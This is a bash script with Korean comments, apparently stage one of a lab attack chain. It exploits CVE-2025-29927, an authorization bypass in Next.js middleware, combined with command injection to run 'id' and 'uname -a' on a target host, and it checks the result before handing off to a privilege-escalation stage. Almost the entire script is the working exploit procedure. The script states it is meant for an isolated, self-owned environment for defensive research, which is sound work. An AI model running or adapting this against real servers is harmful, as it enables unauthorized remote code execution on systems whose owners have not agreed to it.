#!/bin/bash
# 1단계: CVE-2025-29927 인증 우회 + command injection -> RCE (T1190, T1059.004)
# 범위: 본인 소유 격리 재현 환경 전용(방어 연구 목적). TARGET_IP 환경변수 필요.
#   예: export TARGET_IP=$(terraform -chdir=../terraform output -raw web_public_ip)
#   로컬 검증: export TARGET_IP=127.0.0.1:3000
set -euo pipefail
source "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/_common.sh"

echo "[*] 서비스 확인 (공개 랜딩)"
curl -s "http://$TARGET_IP/" -o /dev/null -w "    HTTP %{http_code}\n" || true

echo "[*] 기준선: 인증 우회 없이 보호 API 호출 (미들웨어가 401로 차단해야 정상)"
curl -s -o /dev/null -w "    HTTP %{http_code}\n" \
  -X POST "$API" -H 'content-type: application/json' --data '{"host":"127.0.0.1"}' || true

echo "[*] RCE(우회 후): id"
OUT=$(inject "id"); echo "$OUT" | sed 's/^/    /'

echo "[*] RCE(우회 후): uname -a"
inject "uname -a" | sed 's/^/    /'

if ! echo "$OUT" | grep -q 'uid='; then
  echo "[!] RCE 실패/미확인: id 출력이 비었습니다. TARGET_IP·서비스 기동·우회 헤더(CVE-2025-29927)를 확인하세요."
elif echo "$OUT" | grep -q 'uid=0('; then
  echo "[!] 예상과 다름: RCE가 root로 실행됨. 앱은 비권한 nextjs로 떠야 합니다."
else
  echo "[+] RCE 성공 (비권한 사용자, uid!=0). root 획득은 다음 단계(02_privesc.sh)."
fi
echo "[i] 실행 시각(UTC): $(date -u +%Y-%m-%dT%H:%M:%SZ)"
